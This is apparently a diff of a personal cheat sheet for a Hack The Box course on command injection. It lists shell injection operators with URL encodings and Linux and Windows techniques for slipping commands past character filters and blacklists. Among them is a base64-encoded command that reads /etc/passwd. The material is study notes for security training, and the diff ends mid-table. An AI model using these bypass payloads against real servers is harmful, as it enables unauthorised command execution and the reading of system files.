@@ -1,92 +1,95 @@
 ---
 title: Command Injections
-difficulty: medium
+description: Command injection vulnerabilities can be leveraged to compromise a hosting server and its entire network. This module will teach you how to identify and exploit command injection vulnerabilities and how to use various filter bypassing techniques to avoid security mitigations.
+author:
+  - 21y4d
+difficulty: Medium
 tier: 2
-type: offensive
+type: Offensive
+time: 6 hours
 slug: command-injections
-banner: /cheatsheets/command-injections.webp
 badge: /cheatsheets/badges/inject-with-caution.webp
-sharebleLink: https://academy.hackthebox.com/achievement/badge/7060aa3f-da74-11ee-891c-bea50ffe6cb4
-completedOn: 2024-03-04
+module: /cheatsheets/command-injections.webp
+badgeLink: https://academy.hackthebox.com/achievement/badge/7060aa3f-da74-11ee-891c-bea50ffe6cb4
+moduleLink: https://academy.hackthebox.com/achievement/361848/109
+completedAt: 2024-03-04
+tags:
+  - cheatsheet
+  - CBBH
+---
+## Injection Operators
+
+|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
+|---|---|---|---|
+|Semicolon|`;`|`%3b`|Both|
+|New Line|`\n`|`%0a`|Both|
+|Background|`&`|`%26`|Both (second output generally shown first)|
+|Pipe|`\|`|`%7c`|Both (only second output is shown)|
+|AND|`&&`|`%26%26`|Both (only if first succeeds)|
+|OR|`\|`|`%7c%7c`|Second (only if first fails)|
+|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
+|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|
+
 ---
 
-| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
-| :--------------------- | :---------------------- | :------------------------ | :----------------------------------------- |
-| Semicolon              | `;`                     | `%3b`                     | Both                                       |
-| New Line               | `\n`                    | `%0a`                     | Both                                       |
-| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
-| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
-| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
-| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
-| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
-| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
+# Linux
 
-|**Injection Type**|**Operators**|
-| :--------------- | :---------- |
-|SQL Injection     |`'` `,` `;` `--` `/* */`|
-|Command Injection |`;` `&&`|
-|LDAP Injection    |`*` `(` `)` `&` `\|`|
-|XPath Injection   |`'` `or` `and` `not` `substring` `concat` `count`|
-|OS Command Injection|`;` `&` `\|`|
-|Code Injection      |`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
-|Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
-|Object Injection    |`;` `&` `\|`|
-|XQuery Injection    |`'` `;` `--` `/* */`|
-|Shellcode Injection |`\x` `\u` `%u` `%n`|
-|Header Injection    |`\n` `\r\n` `\t` `%0d` `%0a` `%09`|
+## Filtered Character Bypass
 
-## Linux
+|Code|Description|
+|---|---|
+|`printenv`|Can be used to view all environment variables|
+|**Spaces**||
+|`%09`|Using tabs instead of spaces|
+|`${IFS}`|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`)|
+|`{ls,-la}`|Commas will be replaced with spaces|
+|**Other Characters**||
+|`${PATH:0:1}`|Will be replaced with `/`|
+|`${LS_COLORS:10:1}`|Will be replaced with `;`|
+|`$(tr '!-}' '"-~'<<<[)`|Shift character by one (`[` -> `\`)|
 
-### Filtered Character Bypass
+---
 
-| Code                    | Description                                                                        |
-| :---------------------- | :--------------------------------------------------------------------------------- |
-| `printenv`              | Can be used to view all environment variables                                      |
-| **Spaces**              |                                                                                    |
-| `%09`                   | Using tabs instead of spaces                                                       |
-| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
-| `{ls,-la}`              | Commas will be replaced with spaces                                                |
-| **Other Characters**    |                                                                                    |
-| `${PATH:0:1}`           | Will be replaced with `/`                                                          |
-| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
-| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |
+## Blacklisted Command Bypass
 
-### Blacklisted Command Bypass
+|Code|Description|
+|---|---|
+|**Character Insertion**||
+|`'` or `"`|Total must be even|
+|`$@` or `\`|Linux only|
+|**Case Manipulation**||
+|`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`|Execute command regardless of cases|
+|`$(a="WhOaMi";printf %s "${a,,}")`|Another variation of the technique|
+|**Reversed Commands**||
+|`echo 'whoami' \| rev`|Reverse a string|
+|`$(rev<<<'imaohw')`|Execute reversed command|
+|**Encoded Commands**||
+|`echo -n 'cat /etc/passwd \| grep 33' \| base64`|Encode a string with base64|
+|`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`|Execute b64 encoded string|
 
-| Code                                                         | Description                         |
-| :----------------------------------------------------------- | :---------------------------------- |
-| **Character Insertion**                                      |                                     |
-| `'` or `"`                                                   | Total must be even                  |
-| `$@` or `\`                                                  | Linux only                          |
-| **Case Manipulation**                                        |                                     |
-| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Execute command regardless of cases |
-| `$(a="WhOaMi";printf %s "${a,,}")`                           | Another variation of the technique  |
-| **Reversed Commands**                                        |                                     |
-| `echo 'whoami' \| rev`                                       | Reverse a string                    |
-| `$(rev<<<'imaohw')`                                          | Execute reversed command            |
-| **Encoded Commands**                                         |                                     |
-| `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
-| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |
+---
 
-## Windows
+# Windows
 
-### Filtered Character Bypass
+## Filtered Character Bypass
 
-| **Code** | **Description** |
-| :------- | :-------------- |
-|`Get-ChildItem Env:`   |Can be used to view all environment variables - (PowerShell)|
-|**Spaces**             |                                                            |
-|`%09`                  |Using tabs instead of spaces                                |
-|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)                       |
-|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)                |
-|**Other Characters**   |                                                            |
-|`%HOMEPATH:~0,-17%`    |Will be replaced with `\` - (CMD)                           |
-|`$env:HOMEPATH[0]`     |Will be replaced with `\` - (PowerShell)                    |
+|Code|Description|
+|---|---|
+|`Get-ChildItem Env:`|Can be used to view all environment variables - (PowerShell)|
+|**Spaces**||
+|`%09`|Using tabs instead of spaces|
+|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)|
+|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)|
+|**Other Characters**||
+|`%HOMEPATH:~0,-17%`|Will be replaced with `\` - (CMD)|
+|`$env:HOMEPATH[0]`|Will be replaced with `\` - (PowerShell)|
 
-### Blacklisted Command Bypass
+---
 
-| **Code** | **Description** |
-| :------- | :-------------- |
+## Blacklisted Command Bypass
+
+|Code|Description|
+|---|---|
 |**Character Insertion**||
 |`'` or `"`|Total must be even|
 |`^`|Windows only (CMD)|
